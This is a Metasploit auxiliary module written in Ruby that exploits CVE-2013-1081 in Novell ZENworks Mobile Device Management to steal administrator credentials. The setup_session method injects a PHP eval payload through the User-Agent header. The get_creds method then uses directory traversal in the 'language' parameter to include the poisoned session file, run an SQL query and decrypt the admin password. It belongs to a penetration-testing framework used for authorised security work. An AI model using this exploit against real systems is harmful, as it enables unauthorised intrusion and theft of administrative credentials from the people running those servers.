##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Novell Zenworks Mobile Device Managment Admin Credentials',
      'Description' => %q{
        This module attempts to pull the administrator credentials from
        a vulnerable Novell Zenworks MDM server.
      },
      'Author' =>
        [
          'steponequit',
          'Andrea Micalizzi (aka rgod)' #zdireport
        ],
      'References' =>
        [
          ['CVE', '2013-1081'],
          ['OSVDB', '91119'],
          ['URL', 'http://www.novell.com/support/kb/doc.php?id=7011895']
        ],
      'License' => MSF_LICENSE
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Path to the Novell Zenworks MDM install', '/'])
    ])

    register_advanced_options([
      OptBool.new('SSL', [true, "Negotiate SSL connection", false])
    ])
  end

  def setup_session()
    sess = Rex::Text.rand_text_alpha(8)
    cmd = Rex::Text.rand_text_alpha(8)
    res = send_request_cgi({
      'agent' => "<?php echo(eval($_GET['#{cmd}'])); ?>",
      'method' => "HEAD",
      'uri' => normalize_uri("#{target_uri.path}", "download.php"),
      'headers' => {"Cookie" => "PHPSESSID=#{sess}"},
    })
    return sess,cmd
  end

  def get_creds(session_id,cmd_var)
    cmd  = '$pass=mdm_ExecuteSQLQuery('
    cmd << '"SELECT UserName,Password FROM Administrators where AdministratorSAKey = 1"'
    cmd << ',array(),false,-1,"","","",QUERY_TYPE_SELECT);'
    cmd << 'echo "".$pass[0]["UserName"].":".mdm_DecryptData($pass[0]["Password"])."";'

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri("#{target_uri.path}", "DUSAP.php"),
      'vars_get' => {
        'language' => "res/languages/../../../../php/temp/sess_#{session_id}",
        cmd_var => cmd
      }
    })

    if res.nil?
      print_error("Connection timed out")
      return "", "" # Empty username & password
    end

    creds = res.body.to_s.match(/.*:"(.*)";.*";/)[1]
    return creds.split(":")
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'novellmdm',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    print_status("Verifying that Zenworks login page exists at #{ip}")
    uri = normalize_uri(target_uri.path)

    begin
      res = send_request_raw({
        'method' => 'GET',
        'uri' => uri
      })

      if (res and res.code == 200 and res.body.to_s.match(/ZENworks Mobile Management User Self-Administration Portal/) != nil)
        print_status("Found Zenworks MDM, Checking application version")
        ver = res.body.to_s.match(/<p id="version">Version (.*)<\/p>/)[1]
        print_status("Found Version #{ver}")
        session_id,cmd = setup_session()
        user,pass = get_creds(session_id,cmd)
        return if user.empty? and pass.empty?
        print_good("Got creds. Login:#{user} Password:#{pass}")
        print_good("Access the admin interface here: #{ip}:#{rport}#{target_uri.path}dashboard/")

        report_cred(ip: ip, port: rport, user: user, password: pass, proof: res.body)
      else
        print_error("Zenworks MDM does not appear to be running at #{ip}")
        return :abort
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    rescue ::OpenSSL::SSL::SSLError => e
      return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
    end
  end
end
